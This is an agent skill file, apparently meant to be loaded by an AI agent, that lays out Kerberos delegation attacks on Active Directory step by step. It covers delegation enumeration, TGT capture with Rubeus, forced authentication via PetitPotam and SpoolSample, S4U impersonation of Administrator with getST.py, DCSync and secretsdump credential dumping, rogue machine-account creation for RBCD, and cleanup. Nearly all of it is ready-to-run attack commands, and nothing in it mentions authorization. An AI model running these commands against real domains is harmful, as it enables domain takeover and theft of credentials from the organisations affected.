---
name: ad-delegation-attack
description: "Kerberos delegation attacks (unconstrained/constrained/RBCD). Use when BloodHound reveals delegation configuration, or when you already have control of a service or machine account with an SPN. Abusing the S4U protocol enables impersonating arbitrary users across services, and is commonly used for in-domain privilege escalation and lateral movement."
zh-signals: "Kerberos 委派攻击（非约束/约束/RBCD），通过 S4U 滥用模拟任意用户实现域内提权与横向移动。信号:Kerberos委派,非约束委派,约束委派,RBCD,S4U"
when-to-use: >-
  Use when BloodHound reveals delegation configuration or you control a service
  or machine account with an SPN, and want to impersonate users across services.
metadata:
  tags: "kerberos,delegation,unconstrained,constrained,rbcd,s4u,s4u2self,s4u2proxy,impacket,rubeus,trustedtodelegatetoauth,msds-allowedtoactonbehalfofotheridentity"
  category: "lateral"
---

# Kerberos Delegation Attacks

## Trigger Conditions

Use this skill in the following scenarios:
- BloodHound reveals unconstrained/constrained delegation configuration in the domain
- You control a service account or machine account configured with an SPN
- You hold GenericWrite/GenericAll/WriteDacl permissions on the target computer object
- You need to achieve privilege escalation or lateral movement through delegation

## Prerequisites

- Valid domain credentials (plaintext/hash/ticket)
- Delegation configuration already enumerated (or ready to enumerate)
- Tools: findDelegation.py, getST.py, rbcd.py, addcomputer.py, Rubeus

## Delegation Type Quick Reference

| Type | Key Flag/Attribute | Attack Method |
|------|---------------|----------|
| **Unconstrained delegation** | `TRUSTED_FOR_DELEGATION` (UAC 524288) | Capture the visitor's TGT |
| **Constrained delegation (with protocol transition)** | `msDS-AllowedToDelegateTo` + `TRUSTED_TO_AUTH_FOR_DELEGATION` | S4U2Self + S4U2Proxy |
| **Constrained delegation (without protocol transition)** | `msDS-AllowedToDelegateTo` | Requires the user to authenticate first, or combine with RBCD |
| **RBCD** | `msDS-AllowedToActOnBehalfOfOtherIdentity` | Configure it, then perform the S4U attack |

---

## Decision Tree

```
[Start] You need to exploit Kerberos delegation
    │
    ├─ Is the delegation configuration known?
    │   ├─ No → Phase 1: Delegation enumeration
    │   └─ Yes → Determine the type
    │
    ├─ Unconstrained delegation
    │   ├─ Do you already control that machine?
    │   │   ├─ Yes → Phase 2: Listen for the TGT + force authentication
    │   │   └─ No → You must first obtain control of the machine
    │   └─ Capture the DC TGT → DCSync / lateral movement
    │
    ├─ Constrained delegation
    │   ├─ Is protocol transition available (TrustedToAuthForDelegation)?
    │   │   ├─ Yes → Phase 3: Direct exploitation with S4U2Self + S4U2Proxy
    │   │   └─ No → You need a user ticket or must combine with RBCD
    │   ├─ The target service is not cifs/ldap → use the altservice trick to rewrite the SPN
    │   └─ Obtain the ST → access the target service
    │
    ├─ RBCD
    │   ├─ Do you have write permission on the target?
    │   │   ├─ Yes → Phase 4: RBCD attack
    │   │   └─ No → Look for an ACL path
    │   ├─ MAQ > 0 or a machine account already exists → create/use a machine account
    │   └─ Configure → S4U → access → clean up
    │
    └─ No exploitable delegation → Check ACLs and consider other paths
```

---

## Phase 1: Delegation Enumeration

**Objective**: discover all delegation configuration in the domain

```bash
# findDelegation.py (recommended, discovers all types in one run)
findDelegation.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP>
```

Example output:
```
AccountName   AccountType  DelegationType                      DelegationRightsTo
------------  -----------  ----------------------------------  --------------------------
DC01$         Computer     Unconstrained                       N/A
SVC_SQL       User         Constrained w/ Protocol Transition  MSSQLSvc/db01.domain.local
WEB01$        Computer     Constrained                         http/app01.domain.local
```

### LDAP Filters

```
# Unconstrained delegation (excluding DCs)
(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(primaryGroupID=516)))

# Constrained delegation
(&(objectCategory=*)(msDS-AllowedToDelegateTo=*))

# RBCD
(&(objectCategory=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))
```

### PowerView

```powershell
# Unconstrained delegation (excluding DCs)
Get-DomainComputer -Unconstrained | Where-Object {$_.name -notlike "*DC*"}

# Constrained delegation
Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select-Object name, msds-allowedtodelegateto
```

### BloodHound Cypher

```
MATCH (c:Computer {unconstraineddelegation:true}) WHERE NOT c.name STARTS WITH 'DC' RETURN c.name
MATCH (u)-[:AllowedToDelegate]->(c:Computer) RETURN u.name, c.name
MATCH p=(u)-[:GenericWrite|GenericAll|WriteDacl]->(c:Computer) RETURN p
```

---

## Phase 2: Unconstrained Delegation Exploitation

**Prerequisite**: you control a non-DC machine with `TRUSTED_FOR_DELEGATION`

**Mechanism**: when a user accesses it, the KDC embeds the TGT in the ST, and the server caches it in LSASS. Extracting it allows impersonation.

→ [references/unconstrained-delegation.md](references/unconstrained-delegation.md)

### 2.1 Listen for the TGT

```powershell
Rubeus.exe monitor /interval:10 /nowrap
Rubeus.exe monitor /interval:5 /nowrap /filteruser:DC01$
```

### 2.2 Force Authentication to Trigger It

```bash
# Coercer (integrates multiple methods)
coercer coerce -u <USER> -p <PASSWORD> -d <DOMAIN> -l <UNCONSTRAINED_MACHINE> -t <DC_IP>

# PetitPotam (MS-EFSRPC)
PetitPotam.py <UNCONSTRAINED_MACHINE> <DC_IP>

# PrinterBug (MS-RPRN)
SpoolSample.exe <DC_HOSTNAME> <UNCONSTRAINED_MACHINE>
```

### 2.3 Use the Captured TGT

```powershell
# Import the ticket and run DCSync
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:<DOMAIN> /username:<USER> /password:FakePass /ticket:<BASE64_TGT>
steal_token <PID>
dcsync <DOMAIN> <DOMAIN>\krbtgt
```

```bash
# Linux
export KRB5CCNAME=dc01.ccache
secretsdump.py -k -no-pass '<DOMAIN>/DC01$@dc01.<DOMAIN>'
```

---

## Phase 3: Constrained Delegation Exploitation

**Prerequisite**: you control the credentials of a constrained delegation service account or machine account

→ [references/constrained-delegation.md](references/constrained-delegation.md)

### 3A: With protocol transition — S4U2Self + S4U2Proxy

```bash
# getST.py
getST.py -spn cifs/<TARGET_FQDN> -impersonate Administrator \
  <DOMAIN>/<SERVICE_ACCOUNT>:<PASSWORD>

# Using a hash
getST.py -spn cifs/<TARGET_FQDN> -impersonate Administrator \
  -hashes :<NT_HASH> <DOMAIN>/<SERVICE_ACCOUNT>

# Using a ticket
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass <TARGET_FQDN>
```

```powershell
# Rubeus
Rubeus.exe s4u /user:<SERVICE_ACCOUNT> /rc4:<NT_HASH> /impersonateuser:Administrator /msdsspn:cifs/<TARGET_FQDN> /ptt
```

### The altservice Trick

The sname in the ST is not protected by the signature, so it can be rewritten to another service on the same host:

```bash
# Original target time/dc01 → change to ldap for DCSync
getST.py -spn time/<DC_FQDN> -impersonate Administrator \
  -altservice cifs/<DC_FQDN> <DOMAIN>/<SERVICE_ACCOUNT>:<PASSWORD>
```

```powershell
Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:time/<DC_FQDN> /altservice:ldap /user:<SERVICE_ACCOUNT> /ticket:<BASE64_TGT> /nowrap
```

### 3B: Without protocol transition

S4U2Self tickets are not forwardable, so extra measures are needed:

```bash
# Method 1: combine with RBCD (configured on the service account itself)
rbcd.py -delegate-from '<SERVICE_ACCOUNT>' -delegate-to '<SERVICE_ACCOUNT>$' \
  -action write <DOMAIN>/<USER>:<PASSWORD>
getST.py -spn cifs/<TARGET_FQDN> -impersonate Administrator \
  <DOMAIN>/<SERVICE_ACCOUNT>:<PASSWORD>
```

```powershell
# Method 2: capture a forwardable user ticket, then S4U2Proxy
Rubeus.exe monitor /interval:5 /filteruser:Administrator
Rubeus.exe s4u /ticket:<CAPTURED_TGT> /msdsspn:cifs/<TARGET_FQDN> /ptt
```

---

## Phase 4: Resource-Based Constrained Delegation (RBCD)

**Prerequisite**: GenericWrite/GenericAll/WriteDacl on the target + the ability to create or an existing machine account

→ [references/rbcd-attack.md](references/rbcd-attack.md)

### 4.1 Prerequisite Checks

```bash
# Check MAQ
crackmapexec ldap <DC_IP> -u <USER> -p <PASSWORD> -M maq
```

```powershell
# Check ACLs
Get-DomainObjectAcl -Identity "<TARGET>" -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteDacl"
}
```

### 4.2 Create a Machine Account

```bash
addcomputer.py -computer-name 'YOURPC$' -computer-pass 'P@ssw0rd123' \
  -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD>
```

### 4.3 Configure RBCD

```bash
rbcd.py -delegate-from 'YOURPC$' -delegate-to '<TARGET>$' -action write \
  -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD>
```

### 4.4 S4U Attack

```bash
getST.py -spn cifs/<TARGET_FQDN> -impersonate Administrator \
  -dc-ip <DC_IP> <DOMAIN>/'YOURPC$':'P@ssw0rd123'

export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass <TARGET_FQDN>
```

```powershell
Rubeus.exe hash /password:P@ssw0rd123 /user:YOURPC$ /domain:<DOMAIN>
Rubeus.exe s4u /user:YOURPC$ /rc4:<COMPUTED_HASH> /impersonateuser:Administrator /msdsspn:cifs/<TARGET_FQDN> /ptt
```

### 4.5 Cleanup

```bash
rbcd.py -delegate-to '<TARGET>$' -action flush -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD>
addcomputer.py -computer-name 'YOURPC$' -delete -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD>
```

```powershell
Get-DomainComputer -Identity <TARGET> | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
```

---

## Common Issue Troubleshooting

### S4U fails: KDC_ERR_BADOPTION

1. The impersonated user is in the Protected Users group — switch to another user
2. The user is flagged "Account is sensitive and cannot be delegated" — switch to another user
3. The service account SPN is missing — confirm it is registered
4. Tickets without protocol transition are not forwardable — combine with RBCD

### Cannot create a machine account

1. Check `ms-DS-MachineAccountQuota` (default 10)
2. The quota is exhausted → use a machine account you already control
3. Look for user accounts in the domain that already have an SPN

### RBCD configuration succeeds but S4U fails

1. Confirm the machine account has an SPN (`HOST/YOURPC` is registered automatically)
2. Verify the attribute write with `rbcd.py -action read`
3. Confirm DNS resolution is correct — the SPN must match the DNS name

---

## Tool Reference

| Tool | Purpose | Platform |
|------|------|------|
| findDelegation.py | Enumerate all delegation configuration | Linux |
| getST.py | S4U attack to obtain a service ticket | Linux |
| rbcd.py | Configure/read/clear RBCD | Linux |
| addcomputer.py | Create/delete machine accounts | Linux |
| Rubeus | Kerberos ticket operations | Windows |
| Coercer | Forced authentication (integrates multiple methods) | Linux |
| PetitPotam | MS-EFSRPC forced authentication | Cross-platform |

---

## Further Reading

- → [references/unconstrained-delegation.md](references/unconstrained-delegation.md) — TGT caching mechanism, forced authentication triggers, detection evasion
- → [references/constrained-delegation.md](references/constrained-delegation.md) — S4U protocol mechanism, protocol transition, altservice trick, cross-domain delegation
- → [references/rbcd-attack.md](references/rbcd-attack.md) — complete RBCD attack chain, alternative paths, Shadow Credentials, cleanup and OPSEC
